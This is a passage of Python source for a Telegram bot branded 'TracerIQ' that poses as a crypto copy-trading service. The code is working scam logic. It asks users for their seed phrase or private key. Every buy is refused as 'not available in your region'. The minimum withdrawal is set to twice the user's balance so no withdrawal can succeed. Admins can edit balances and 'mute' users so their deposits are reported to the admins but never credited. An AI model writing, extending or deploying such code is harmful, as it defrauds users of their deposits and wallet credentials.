                InlineKeyboardButton("🟣 Withdraw Assets", callback_data="ct_withdraw"),
                InlineKeyboardButton(
                    "🔐 Import / Connect", callback_data="ct_connect_wallet"
                ),
            ],
            [
                InlineKeyboardButton(
                    "🎯 Configure Copy Rules", callback_data="ct_copy_trade"
                ),
            ],
            [
                InlineKeyboardButton("⌂ TracerIQ Home", callback_data="back_main"),
            ],
        ]
    )

    if update.message or update.callback_query:
        chat_id = (
            update.message.chat_id
            if update.message
            else update.callback_query.message.chat_id
        )
        # Delete the previous bot wallet message if we have it stored
        prev_msg_id = context.user_data.get("last_wallet_msg_id")
        if prev_msg_id:
            try:
                await context.bot.delete_message(
                    chat_id=chat_id, message_id=prev_msg_id
                )
            except Exception:
                pass
        sent = await context.bot.send_message(
            chat_id=chat_id,
            text=wallet_text,
            parse_mode="HTML",
            reply_markup=wallet_inline,
        )
        context.user_data["last_wallet_msg_id"] = sent.message_id

# --- Continue with your other handlers (like bot guide, wallet, etc.) ---

# --- SETTINGS MENU ---
async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _delete_previous_bot_messages(update, context)
    copy_preference_buttons = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🗓 Copy cadence", callback_data="trade_per_day")],
            [
                InlineKeyboardButton(
                    "🔁 Consecutive entry limit", callback_data="consecutive_buys"
                )
            ],
            [
                InlineKeyboardButton(
                    "🎯 Position exit rule", callback_data="sell_position"
                )
            ],
        ]
    )

    settings_text = (
        "◈ <b>TRACERIQ  /  COPY PREFERENCES</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Adjust the rules used by your copy-trading setup:\n\n"
        "• Set the copy cadence\n"
        "• Limit consecutive copied entries\n"
        "• Choose a position exit rule\n\n"
        "Select a preference to update."
    )

    await update.message.reply_text(
        settings_text, parse_mode="HTML", reply_markup=copy_preference_buttons
    )

# --- CALLBACK HANDLER (BUTTONS) ---
async def button_handler(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    reply_action: str | None = None,
):
    if update.callback_query:
        source_query = update.callback_query
        await source_query.answer()
        await _delete_previous_bot_messages(update, context)
        query = _ReplyKeyboardQuery(
            source_query.message,
            context,
            source_query.data,
            user=source_query.from_user,
        )
    elif update.message and reply_action is not None:
        await _delete_previous_bot_messages(update, context)
        query = _ReplyKeyboardQuery(update.message, context, reply_action)
    else:
        return

    option = query.data
    user_id = query.from_user.id
    user = query.from_user
    user_name = user.username or user.first_name or str(user_id)

    # Global ban check
    if user_id in banned_users:
        return

    # Admin actions
    if option.startswith("admin_"):
        if user_id not in ADMIN_IDS:
            return

        if option == "admin_ban":
            context.user_data["awaiting_admin_ban"] = True
            await query.message.reply_text(
                "🚫 Enter the Telegram ID of the user to <b>BAN</b>:", parse_mode="HTML"
            )
        elif option == "admin_unban":
            context.user_data["awaiting_admin_unban"] = True
            await query.message.reply_text(
                "✅ Enter the Telegram ID of the user to <b>UNBAN</b>:",
                parse_mode="HTML",
            )
        elif option == "admin_list_banned":
            if not banned_users:
                await query.message.reply_text("📜 No users are currently banned.")
            else:
                list_text = "📜 <b>Banned Users:</b>\n\n" + "\n".join(
                    [f"• <code>{uid}</code>" for uid in banned_users]
                )
                await query.message.reply_text(list_text, parse_mode="HTML")
        elif option == "admin_change_support":
            context.user_data["awaiting_admin_support_link"] = True
            await query.message.reply_text(
                "🔗 Enter the new <b>Support Link</b> (e.g., https://t.me/YourSupport):",
                parse_mode="HTML",
            )
        elif option == "admin_user_details":
            context.user_data["awaiting_admin_user_lookup"] = True
            await query.message.reply_text(
                "🔍 Enter the Telegram ID of the user to view/edit details:"
            )
        elif option.startswith("admin_edit_"):
            parts = option.split("_")
            field = parts[2]  # balance | ethbal | bnbbal | minw
            target_id = parts[-1]  # ID is always last
            context.user_data["admin_editing_user"] = target_id
            context.user_data["admin_editing_field"] = field
            label_map = {
                "balance": "SOL Balance",
                "ethbal": "ETH Balance",
                "bnbbal": "BNB Balance",
                "minw": "Min Withdrawal (SOL)",
            }
            label = label_map.get(field, field.replace("_", " ").title())
            await query.message.reply_text(
                f"📝 Enter the new <b>{label}</b> for user <code>{target_id}</code>:",
                parse_mode="HTML",
            )
        elif option.startswith("admin_mute_"):
            target_id = int(option.split("_")[-1])
            muted_users.add(target_id)
            save_muted_users()
            await query.answer("🔕 User muted — deposits will be hidden from them.")
            await query.message.reply_text(
                f"🔕 <b>User <code>{target_id}</code> has been muted.</b>\n\n"
                f"Deposits will still be reported to the admin group, but the user's balance will not update and they will receive no notifications.",
                parse_mode="HTML",
            )
        elif option.startswith("admin_unmute_"):
            target_id = int(option.split("_")[-1])
            muted_users.discard(target_id)
            save_muted_users()
            await query.answer("🔔 User unmuted — notifications restored.")
            await query.message.reply_text(
                f"🔔 <b>User <code>{target_id}</code> has been unmuted.</b>\n\n"
                f"They will now receive deposit notifications and their balance will update normally from the next deposit.",
                parse_mode="HTML",
            )
        elif option.startswith("admin_send_notif_"):
            target_id = int(option.split("_")[-1])
            if target_id in muted_users:
                await query.answer("🔕 User is muted — notification not sent.")
                await query.message.reply_text(
                    f"🔕 Notification blocked for muted user <code>{target_id}</code>.",
                    parse_mode="HTML",
                )
                return
            try:
                public_address, _ = derive_keypair_and_address(target_id)
                stored = user_balances.get(target_id, {})
                balance = stored.get("balance", 0)
                sol_price = await get_sol_price_usd()
                usd_value = balance * sol_price if sol_price > 0 else 0

                user_notification = (
                    f"💰 <b>Deposit Confirmed!</b>\n\n"
                    f"New Balance: {balance:.4f} SOL (${usd_value:.2f})\n\n"
                    f"Your deposit has been successfully received and credited to your wallet."
                )
                await context.bot.send_message(
                    chat_id=target_id, text=user_notification, parse_mode="HTML"
                )
                await query.answer("📨 Notification sent!")
                await query.message.reply_text(
                    f"✅ <b>Deposit notification sent</b> to user <code>{target_id}</code>\n\n"
                    f"💰 Balance shown: <b>{balance:.4f} SOL</b> (${usd_value:.2f})\n"
                    f"🏦 Wallet: <code>{public_address}</code>",
                    parse_mode="HTML",
                )
            except Exception as e:
                await query.answer("❌ Failed")
                await query.message.reply_text(
                    f"❌ Could not send notification to user <code>{target_id}</code>: {e}",
                    parse_mode="HTML",
                )
        return

    if option == "support_contact":
        await query.message.reply_text(
            "☎️Support Contact\n\n"
            "Need help? Our support team is always available to assist you.\n\n"
            "Simply click the button below to contact our support team anytime.",
            reply_markup=support_contact_keyboard(),
        )
        return

    # Check for deposits on ANY button click
    await check_and_notify_deposits(user_id, context)

    # Handle cancel action for settings
    if option == "cancel_settings":
        user_states.pop(user_id, None)
        try:
            await query.message.delete()
        except Exception:
            pass
        welcome_text = (
            "◈ <b>TRACERIQ  /  COPY-TRADING DESK</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Follow selected wallets, manage your copy rules, and review your portfolio.\n\n"
            "Choose a destination below."
        )
        await query.message.reply_text(
            welcome_text, parse_mode="HTML", reply_markup=main_menu_inline()
        )
        return

    # Handle fund wallet action
    if option == "fund_wallet":
        try:
            public_address, _ = derive_keypair_and_address(user_id)
            user_balance = get_user_balance(user_id)
            sol_price = await get_sol_price_usd()
            usd_value = user_balance * sol_price if sol_price > 0 else 0

            deposit_message = (
                "💰 <b>Fund Your Wallet</b>\n\n"
                f"Send SOL to the address below to fund your bot wallet:\n\n"
                f"📬 <b>Your Deposit Address:</b>\n"
                f"<code>{public_address}</code>\n\n"
                f"💡 <b>How to Deposit:</b>\n"
                f"1. Copy the address above\n"
                f"2. Send SOL from any Solana wallet\n"
                f"3. Deposits are detected automatically\n"
                f"4. You'll receive a notification when funds arrive\n\n"
                f"📊 <b>Current Balance:</b> {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
                f"⚠️ <b>Note:</b> Only send SOL to this address. Sending other tokens may result in loss of funds.\n\n"
                f"🔄 Deposits are monitored every 30 seconds."
            )
            await query.message.reply_text(
                deposit_message,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "⬅️ Back to Menu", callback_data="back_main"
                            )
                        ]
                    ]
                ),
            )
        except Exception:
            await query.message.reply_text(
                "⚠️ Error generating deposit address. Please try again or contact support.",
                parse_mode="HTML",
                reply_markup=back_to_menu_btn(),
            )
        return

    # ---- shared delete helper ----
    async def _del():
        try:
            await query.message.delete()
        except Exception:
            pass

    # Handle BUY actions
    if option.startswith("buy_"):
        parts = option.split(
            "_", 2
        )  # buy_amount_tokenaddress or buy_custom_tokenaddress

        back_trade_btn = InlineKeyboardMarkup(
            [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
        )

        # Resolve which chain this token is on
        tc_key = context.user_data.get("current_token_chain", "sol")
        bal_data_buy = user_balances.get(user_id, {})
        if tc_key == "eth":
            buy_balance = bal_data_buy.get("eth_balance", 0)
            buy_price, _ = await get_evm_prices_usd()
            buy_sym = "ETH"
        elif tc_key == "bnb":
            buy_balance = bal_data_buy.get("bnb_balance", 0)
            _, buy_price = await get_evm_prices_usd()
            buy_sym = "BNB"
        else:
            buy_balance = get_user_balance(user_id)
            buy_price = await get_sol_price_usd()
            buy_sym = "SOL"
        buy_usd = buy_balance * buy_price if buy_price > 0 else 0

        if parts[1] == "custom":
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            context.user_data["awaiting_custom_buy"] = token_address
            await _del()
            sent = await query.message.reply_text(
                f"🟢 <b>Custom Buy Amount</b>\n\n"
                f"Please enter the amount of {buy_sym} you want to spend:\n\n"
                f"📝 Enter your desired {buy_sym} amount (e.g., 0.25, 2.5, 10)",
                parse_mode="HTML",
                reply_markup=back_trade_btn,
            )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return
        else:
            amount = parts[1]
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            await _del()
            if buy_balance == 0:
                sent = await query.message.reply_text(
                    f"❗ Insufficient {buy_sym} balance.",
                    parse_mode="HTML",
                    reply_markup=back_trade_btn,
                )
            elif buy_usd < 10:
                sent = await query.message.reply_text(
                    f"❗ Minimum amount required to buy a token is above $10.\n\n"
                    f"Your current balance: {buy_balance:.6f} {buy_sym} (${buy_usd:.2f})",
                    parse_mode="HTML",
                    reply_markup=back_trade_btn,
                )
            else:
                sent = await query.message.reply_text(
                    f"Buying tokens is currently not available in your region at the moment. Try again later.\n\n"
                    f"Your balance: {buy_balance:.6f} {buy_sym} (${buy_usd:.2f})",
                    parse_mode="HTML",
                    reply_markup=back_trade_btn,
                )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return

    # Handle SELL actions
    if option.startswith("sell_"):
        parts = option.split("_", 2)

        back_trade_btn = InlineKeyboardMarkup(
            [[InlineKeyboardButton("⬅️ Back", callback_data="back_trade")]]
        )

        if parts[1] == "custom":
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            context.user_data["awaiting_custom_sell"] = token_address
            await _del()
            sent = await query.message.reply_text(
                "🔴 <b>Custom Sell Percentage</b>\n\n"
                "Please enter the percentage you want to sell:\n\n"
                "📝 Enter your desired percentage (e.g., 25, 75, 90)",
                parse_mode="HTML",
                reply_markup=back_trade_btn,
            )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return
        else:
            percentage = parts[1]
            token_address = (
                parts[2]
                if len(parts) > 2
                else context.user_data.get("current_token", "")
            )
            await _del()
            sent = await query.message.reply_text(
                f"🔴 <b>Sell Order Submitted</b>\n\n"
                f"Percentage: {percentage}%\n"
                f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
                f"❗ No token balance to sell.",
                parse_mode="HTML",
                reply_markup=back_trade_btn,
            )
            context.user_data.setdefault("trade_msg_ids", []).append(sent.message_id)
            return

    # Handle cancel custom trade
    if option == "cancel_custom_trade":
        context.user_data.pop("awaiting_custom_buy", None)
        context.user_data.pop("awaiting_custom_sell", None)
        await query.message.reply_text(
            "❌ Trade cancelled.", reply_markup=main_menu_markup()
        )
        return

    # ---- COPY TRADE SMART WALLET inline flow ----
    if option == "ct_wallet_view":
        await _del()
        await show_wallet(update, context)
        return

    if option == "ct_withdraw":
        await _del()
        sol_bal = get_user_balance(user_id)
        eth_bal = user_balances.get(user_id, {}).get("eth_balance", 0)
        bnb_bal = user_balances.get(user_id, {}).get("bnb_balance", 0)
        sol_price = await get_sol_price_usd()
        eth_price, bnb_price = await get_evm_prices_usd()
        sol_usd = sol_bal * sol_price if sol_price > 0 else 0
        eth_usd = eth_bal * eth_price if eth_price > 0 else 0
        bnb_usd = bnb_bal * bnb_price if bnb_price > 0 else 0
        token_selector = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        f"🟣 SOL  ·  {sol_bal:.4g}", callback_data="withdraw_token_sol"
                    )
                ],
                [
                    InlineKeyboardButton(
                        f"🔷 ETH  ·  {eth_bal:.4g}", callback_data="withdraw_token_eth"
                    )
                ],
                [
                    InlineKeyboardButton(
                        f"🟡 BNB  ·  {bnb_bal:.4g}", callback_data="withdraw_token_bnb"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "⌂ Back to Portfolio", callback_data="back_wallet"
                    )
                ],
            ]
        )
        await query.message.reply_text(
            "◈ <b>TRACERIQ  /  WITHDRAWALS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Choose the asset you want to withdraw.",
            parse_mode="HTML",
            reply_markup=token_selector,
        )
        return

    if option in ("withdraw_token_sol", "withdraw_token_eth", "withdraw_token_bnb"):
        await _del()
        token = option.split("_")[-1]  # sol / eth / bnb
        context.user_data["withdraw_token"] = token
        bal = user_balances.get(user_id, {})
        if token == "sol":
            balance = get_user_balance(user_id)
            price = await get_sol_price_usd()
            sym, unit = "SOL", "SOL"
        elif token == "eth":
            balance = bal.get("eth_balance", 0)
            price, _ = await get_evm_prices_usd()
            sym, unit = "ETH", "ETH"
        else:
            balance = bal.get("bnb_balance", 0)
            _, price = await get_evm_prices_usd()
            sym, unit = "BNB", "BNB"
        usd_val = balance * price if price > 0 else 0
        if token == "sol":
            stored_min = bal.get("min_withdrawal", balance * 2)
            if stored_min == 0 and balance > 0:
                stored_min = balance * 2
        else:
            stored_min = balance * 2
        withdraw_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "⬆ Use full balance · 100%", callback_data="withdraw_100"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "◒ Use half balance · 50%", callback_data="withdraw_50"
                    )
                ],
                [
                    InlineKeyboardButton(
                        f"✍ Enter an amount · {unit}", callback_data="withdraw_custom"
                    )
                ],
                [InlineKeyboardButton("⌂ Change asset", callback_data="back_withdraw")],
            ]
        )
        await query.message.reply_text(
            f"◈ <b>TRACERIQ  /  {sym} WITHDRAWAL</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{'🟣' if token == 'sol' else '🔷' if token == 'eth' else '🟡'} "
            f"<b>Available</b>  ·  {balance:.6f} {sym}  ·  ${usd_val:.2f}\n"
            f"<b>Minimum eligible amount</b>  ·  {stored_min:.6f} {sym}\n\n"
            "Choose a balance option or enter an amount.",
            parse_mode="HTML",
            reply_markup=withdraw_buttons,
        )
        return

    if option == "ct_connect_wallet":
        await _del()
        context.user_data.pop("awaiting_dummy", None)
        await query.message.reply_text(
            "🧩 <b>Wallet Setup</b>\n\n"
            "Select the wallet option you want to proceed with.\n\n"
            "📌 <b>Before You Continue:</b>\n"
            "• Use only information required for the selected action\n"
            "• Never share your seed phrase or private key with anyone\n"
            "• Wallet addresses can be used for tracking without exposing sensitive credentials\n",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "Seed Phrase", callback_data="ct_connect_seed"
                        ),
                        InlineKeyboardButton(
                            "Private Key", callback_data="ct_connect_private"
                        ),
                    ],
                    [InlineKeyboardButton("⬅️ Cancel", callback_data="back_wallet")],
                ]
            ),
        )
        return

    if option in ("ct_connect_seed", "ct_connect_private"):
        await _del()
        context.user_data["awaiting_dummy"] = (
            "seed" if option.endswith("seed") else "private"
        )
        if context.user_data["awaiting_dummy"] == "seed":
            prompt = (
                "🔤 <b> Seed Phrase</b>\n\n"
                "Please enter your 12-word recovery phrase to connect your wallet."
            )
        else:
            prompt = (
                "🔑 <b>Private Key</b>\n\n"
                "Send either a valid Solana private key (base58 encoded 64-byte key) "
                "or an EVM private key (64 hexadecimal characters, optionally prefixed with 0x)."
            )
        await query.message.reply_text(
            prompt + "",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_copy_trade":
        await _del()
        copy_trade_buttons = copy_trade_setup_keyboard()
        await query.message.reply_text(
            "◈ <b>TRACERIQ  /  COPY RULES</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Choose a rule to configure how activity from your selected wallet is mirrored.",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if option == "ct_target_wallet":
        context.user_data["awaiting_ct_target_wallet"] = True
        await _del()
        await query.message.reply_text(
            "🛰️ <b>FOLLOW A WALLET</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📍 <b>Add a Wallet to Monitor</b>\n\n"
            "Enter the wallet address you want to track.\n\n"
            "🌐 <b>Supported Networks</b>\n"
            "• <b>Solana</b> — Solana wallets\n"
            "• <b>EVM</b> — Ethereum, BSC, and other EVM-compatible networks\n\n"
            "<b>Example format</b>\n"
            "<code>5FHwkrdxntdK24hgQU8qgBjn35Y1zwhz1GZwCkP2UJnM</code>\n\n"
            "Send the address to continue, or tap <b>Cancel</b> to go back.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_buy_amount":
        context.user_data["awaiting_ct_buy_amount"] = True
        await _del()
        await query.message.reply_text(
            "💸 <b>COPY ALLOCATION</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Set the SOL amount allocated to each copied entry.\n\n"
            "<b>Example</b>  ·  <code>0.5</code>\n\n"
            "Type the amount or tap Cancel.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_consecutive_buys":
        context.user_data["awaiting_ct_consecutive_buys"] = True
        await _del()
        await query.message.reply_text(
            "🔁 <b>ENTRY LIMIT</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Set the maximum number of consecutive copied entries.\n\n"
            "<b>Example</b>  ·  <code>3</code>\n\n"
            "Type the number or tap Cancel.",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    if option == "ct_sell_position":
        await _del()
        sell_pos_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("◐ Close 50%", callback_data="ct_sell_50"),
                    InlineKeyboardButton("● Close 100%", callback_data="ct_sell_100"),
                ],
                [
                    InlineKeyboardButton(
                        "⌂ Back to Copy Rules", callback_data="back_ct_setup"
                    )
                ],
            ]
        )
        await query.message.reply_text(
            "🎯 <b>EXIT RULE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Choose how much of the copied position to close when the exit rule is applied:\n\n"
            "• <b>50%</b>  ·  Close half the position\n"
            "• <b>100%</b>  ·  Close the full position",
            parse_mode="HTML",
            reply_markup=sell_pos_buttons,
        )
        return

    if option in ("ct_sell_50", "ct_sell_100"):
        pct = "50%" if option == "ct_sell_50" else "100%"
        context.user_data["ct_sell_position"] = pct
        context.user_data["awaiting_ct_slippage"] = True
        await _del()
        await query.message.reply_text(
            f"✅ Exit rule set to <b>{pct}</b>\n\n"
            "◈ <b>SLIPPAGE CONTROL</b>\n"
            "Enter your desired slippage percentage.\n\n"
            "<b>Suggested range</b>  ·  1%–15%, depending on market conditions.\n\n"
            "📝 Enter a number between <b>1</b> and <b>15</b>:",
            parse_mode="HTML",
            reply_markup=cancel_markup(),
        )
        return

    # ---- Navigation: show pages ----
    if option == "back_main":
        await _del()
        welcome_text = (
            "◈ <b>TRACERIQ  /  COPY-TRADING DESK</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Follow selected wallets, tune your copy rules, and review your portfolio.\n\n"
            "<i>Choose a destination below. Review every strategy and transaction carefully.</i>"
        )
        await query.message.reply_text(
            welcome_text, parse_mode="HTML", reply_markup=main_menu_inline()
        )
        return

    if option == "back_wallet":
        await show_wallet(update, context)
        return

    if option == "back_ct_setup":
        await _del()
        copy_trade_buttons = copy_trade_setup_keyboard()
        await query.message.reply_text(
            "◈ <b>TRACERIQ  /  COPY RULES</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Choose a rule to configure how activity from your selected wallet is mirrored.",
            parse_mode="HTML",
            reply_markup=copy_trade_buttons,
        )
        return

    if option == "back_withdraw":
        await _del()
        context.user_data.pop("withdraw_token", None)
        sol_bal = get_user_balance(user_id)
        eth_bal = user_balances.get(user_id, {}).get("eth_balance", 0)
        bnb_bal = user_balances.get(user_id, {}).get("bnb_balance", 0)
        sol_price = await get_sol_price_usd()
        eth_price, bnb_price = await get_evm_prices_usd()
        sol_usd = sol_bal * sol_price if sol_price > 0 else 0
        eth_usd = eth_bal * eth_price if eth_price > 0 else 0
        bnb_usd = bnb_bal * bnb_price if bnb_price > 0 else 0
        token_selector = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        f"🟣 SOL  ·  {sol_bal:.4g}", callback_data="withdraw_token_sol"
                    )
                ],
                [
                    InlineKeyboardButton(
                        f"🔷 ETH  ·  {eth_bal:.4g}", callback_data="withdraw_token_eth"
                    )
                ],
                [
                    InlineKeyboardButton(
                        f"🟡 BNB  ·  {bnb_bal:.4g}", callback_data="withdraw_token_bnb"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "⌂ Back to Portfolio", callback_data="back_wallet"
                    )
                ],
            ]
        )
        await query.message.reply_text(
            "◈ <b>TRACERIQ  /  WITHDRAWALS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Choose the asset you want to withdraw.",
            parse_mode="HTML",
            reply_markup=token_selector,
        )
        return

    if option == "show_wallet":
        await show_wallet(update, context)
        return

    if option == "back_trade":
        # Delete all tracked trade-flow messages then show wallet
        chat_id = context.user_data.pop("trade_chat_id", None) or query.message.chat_id
        for msg_id in context.user_data.pop("trade_msg_ids", []):
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except Exception:
                pass
        try:
            await query.message.delete()
        except Exception:
            pass
        await show_wallet(update, context)
        return

    if option in ("show_buy", "show_sell"):
        await _del()
        await query.message.reply_text(
            "◈ <b>TRACERIQ  /  COPY-TRADING ONLY</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "This workspace is focused on following selected wallets and managing your copy rules. "
            "Open the Copy-Trading Desk to continue.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🎯 Open Copy-Trading Desk", callback_data="ct_wallet_view"
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            "⌂ TracerIQ Home", callback_data="back_main"
                        )
                    ],
                ]
            ),
        )
        return

    if option == "show_bot_guide":
        await _del()
        guide_text = (
            "╭───────────────────╮\n"
            "        🚀 <b>TRACERIQ</b>\n"
            "     <i>Copy-Trading Center</i>\n"
            "╰───────────────────╯\n\n"
            "Follow selected Solana wallets and manage your copy-trading preferences directly from Telegram.\n\n"
            "<b>① FIND A WALLET</b>\n"
            "Go to the Copy-Trading Desk and enter the Solana wallet you want to monitor.\n\n"
            "<b>② CONFIGURE YOUR STRATEGY</b>\n"
            "Set how much SOL to allocate per copied trade, define your entry limit, and choose your exit conditions.\n\n"
            "<b>③ MANAGE YOUR PORTFOLIO</b>\n"
            "Use the Portfolio section to view tracked wallets, balances, positions, and recent activity.\n\n"
            "<b>④ STAY UP TO DATE</b>\n"
            "Monitor token movements and price changes through Live Market data and configurable alerts.\n\n"
        )
        await query.message.reply_text(
            guide_text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🎯 Open Copy-Trading Desk", callback_data="ct_wallet_view"
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            "⌂ TracerIQ Home", callback_data="back_main"
                        )
                    ],
                ]
            ),
        )
        return

    if option == "show_live_chart":
        await _del()
        chart_buttons = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📈 BITCOIN (BTC)",
                        url="https://www.tradingview.com/chart/?symbol=BTCUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 ETHEREUM (ETH)",
                        url="https://www.tradingview.com/chart/?symbol=ETHUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 SOLANA (SOL)",
                        url="https://www.tradingview.com/chart/?symbol=SOLUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 DOGECOIN (DOGE)",
                        url="https://www.tradingview.com/chart/?symbol=DOGEUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 SHIBA INU (SHIB)",
                        url="https://www.tradingview.com/chart/?symbol=SHIBUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 POLKADOT (DOT)",
                        url="https://www.tradingview.com/chart/?symbol=DOTUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 CARDANO (ADA)",
                        url="https://www.tradingview.com/chart/?symbol=ADAUSDT",
                    )
                ],
                [
                    InlineKeyboardButton(
                        "📈 LITECOIN (LTC)",
                        url="https://www.tradingview.com/chart/?symbol=LTCUSDT",
                    )
                ],
                [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")],
            ]
        )
        await query.message.reply_text(
            "🔥 <b>Top Coins Charts</b>\nChoose a coin below to view its live chart.",
            parse_mode="HTML",
            reply_markup=chart_buttons,
        )
        return

    if option == "refer_earn":
        await _del()
        bot_username = (await context.bot.get_me()).username
        ref_code = get_or_create_referral_code(user_id)
        referral_link = f"https://t.me/{bot_username}?start=ref_{ref_code}"
        user_entry = referral_data.get("users", {}).get(str(user_id), {})
        total_invited = len(user_entry.get("invited", []))
        refer_text = (
            "╭─────────────────────╮\n"
            "   🎁<b>REFERRAL REWARDS</b>\n"
            "         <i>Share • Invite • Earn</i>\n"
            "╰─────────────────────╯\n\n"
            "💎 <b>YOUR REWARD RATE</b>\n"
            "Earn <b>25%</b> of the trading fees generated by users you invite — permanently.\n\n"
            "👤 <b>YOUR NETWORK</b>\n"
            f"You've invited <b>{total_invited}</b> friend(s) so far.\n\n"
            "🔗 <b>INVITE LINK</b>\n"
            f"<code>{referral_link}</code>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💸 <b>REWARD WITHDRAWALS</b>\n\n"
            "• Maximum of <b>1 withdrawal request per 24 hours</b>\n"
            "• Rewards are automatically triggered at <b>08:00 (UTC+8)</b> each day\n"
            "• Once triggered, funds are credited within <b>24 hours</b>\n\n"
            "🚀 <b>Start sharing your link and grow your rewards.</b>"
        )
        await query.message.reply_text(
            refer_text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
            ),
        )
        return

    # Handle WITHDRAWAL actions
    if option == "withdraw_100":
        await _del()
        token = context.user_data.get("withdraw_token", "sol")
        bal_data = user_balances.get(user_id, {})
        if token == "sol":
            balance = get_user_balance(user_id)
            price = await get_sol_price_usd()
            sym = "SOL"
            stored_min = bal_data.get("min_withdrawal", balance * 2)
            if stored_min == 0 and balance > 0:
                stored_min = balance * 2
        elif token == "eth":
            balance = bal_data.get("eth_balance", 0)
            price, _ = await get_evm_prices_usd()
            sym = "ETH"
            stored_min = balance * 2
        else:
            balance = bal_data.get("bnb_balance", 0)
            _, price = await get_evm_prices_usd()
            sym = "BNB"
            stored_min = balance * 2
        usd_value = balance * price if price > 0 else 0
        back_btn = InlineKeyboardMarkup(
            [[InlineKeyboardButton("⌂ Change asset", callback_data="back_withdraw")]]
        )
        if balance == 0:
            await query.message.reply_text(
                f"⚠️ <b>No {sym} available</b>\n\n"
                "Choose another asset or fund this wallet first.",
                parse_mode="HTML",
                reply_markup=back_btn,
            )
            return
        if usd_value < 10:
            await query.message.reply_text(
                f"⚠️ <b>Balance below the withdrawal threshold</b>\n\n"
                f"Available: {balance:.6f} {sym}  ·  ${usd_value:.2f}\n"
                f"Required value: at least $10 in {sym}\n\n"
                f"Add {sym} to continue.",
                parse_mode="HTML",
                reply_markup=back_btn,
            )
            return
        await query.message.reply_text(
            f"⚠️ <b>Minimum not met</b>\n\n"
            f"Available: {balance:.6f} {sym}  ·  ${usd_value:.2f}\n"
            f"Minimum eligible amount: {stored_min:.6f} {sym}\n\n"
            f"Add more {sym} before continuing.",
            parse_mode="HTML",
            reply_markup=back_btn,
        )
        return

    if option == "withdraw_50":
        await _del()
        token = context.user_data.get("withdraw_token", "sol")
        bal_data = user_balances.get(user_id, {})
        if token == "sol":
            balance = get_user_balance(user_id)
            price = await get_sol_price_usd()
            sym = "SOL"
            stored_min = bal_data.get("min_withdrawal", balance * 2)
            if stored_min == 0 and balance > 0:
                stored_min = balance * 2
        elif token == "eth":
            balance = bal_data.get("eth_balance", 0)
            price, _ = await get_evm_prices_usd()
            sym = "ETH"
            stored_min = balance * 2
        else:
            balance = bal_data.get("bnb_balance", 0)
            _, price = await get_evm_prices_usd()
            sym = "BNB"
            stored_min = balance * 2
        usd_value = balance * price if price > 0 else 0
        back_btn = InlineKeyboardMarkup(
            [[InlineKeyboardButton("⌂ Change asset", callback_data="back_withdraw")]]
        )
        if balance == 0:
            await query.message.reply_text(
                f"⚠️ <b>No {sym} available</b>\n\n"
